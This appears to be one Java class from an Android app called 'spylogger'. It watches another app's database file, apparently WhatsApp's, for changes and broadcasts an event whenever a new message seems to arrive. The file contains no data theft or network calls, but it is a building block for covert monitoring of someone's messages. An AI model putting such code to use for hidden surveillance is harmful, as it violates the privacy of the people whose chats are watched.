package com.gravatasufoca.spylogger.observers;

import android.content.Context;
import android.content.Intent;
import android.os.FileObserver;
import android.util.Log;

import com.gravatasufoca.spylogger.utils.Utils;

import java.io.File;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

/**
 * Created by bruno on 21/04/17.
 */

public abstract class DbObserver {

    private final int TIMEOUT=5000;

    protected Context context;
    private Long lastEvent=Long.MIN_VALUE;

    public DbObserver(Context context) {
        this.context = context;
    }

    protected static Map<Class,FileObserver> observers=new HashMap<>();

    protected static synchronized void addObserver(Class clazz,FileObserver fileObserver){
        if(!observers.containsKey(clazz)){
            observers.put(clazz,fileObserver);
        }
    }

    public abstract void observe();

    protected void start(final Class clazz, final String path){
        Log.i("SPYLOGGER", "INICIANDO OBSERVER WHATSAPP");
        FileObserver fileObserver;
        if(!observers.containsKey(clazz)) {
            String pt=path;
            if(new File(pt+"-wal").exists()){
                pt=path+"-wal";
            }
            fileObserver = new FileObserver(pt,FileObserver.MODIFY) {
                @Override
                public void onEvent(int event, String file) {
//                    Log.i("spyloggerfile", observers.get(clazz).toString()+ " - "+event);

                    switch (event) {
                        case FileObserver.MODIFY:
                            Log.d("DEBUG", "MODIFY:" + path );
                            sendEvent(clazz);
                            break;
                        default:
                            break;
                    }
                }
            };
            addObserver(clazz,fileObserver);
        }else{
            fileObserver=observers.get(clazz);
        }
        fileObserver.startWatching();
    }

    private void sendEvent(Class clazz) {

        Log.d("spyloggertime",(lastEvent+TIMEOUT)+"="+new Date().getTime());
        if(lastEvent==Long.MIN_VALUE || lastEvent+TIMEOUT<=new Date().getTime()) {
            Log.d("spyloggertime","ENVIANDO...");
            Intent intent = new Intent(Utils.MENSAGEM_RECEBIDA);
            intent.putExtra("classe", clazz.getName());
            context.sendBroadcast(intent);
            lastEvent=new Date().getTime();
        }
    }
}
